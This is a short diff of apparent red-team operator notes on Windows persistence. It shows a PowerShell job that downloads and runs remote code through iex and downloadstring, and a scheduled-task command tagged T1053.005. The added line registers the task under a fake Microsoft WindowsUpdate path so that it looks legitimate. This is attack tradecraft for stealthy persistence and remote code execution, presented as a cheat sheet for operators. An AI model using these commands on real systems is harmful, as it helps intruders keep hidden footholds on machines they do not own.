@@ -27,6 +27,9 @@ $_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("url
 
 Schedule Task: T1053.005
 schtaskscreate \Beacon XML CREATE <-- BOF to schedule a task (Replace Beacon with Name we want)
+
+schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
+
 schtasksdelete to remove it.
 
 -----------------------------------------------------
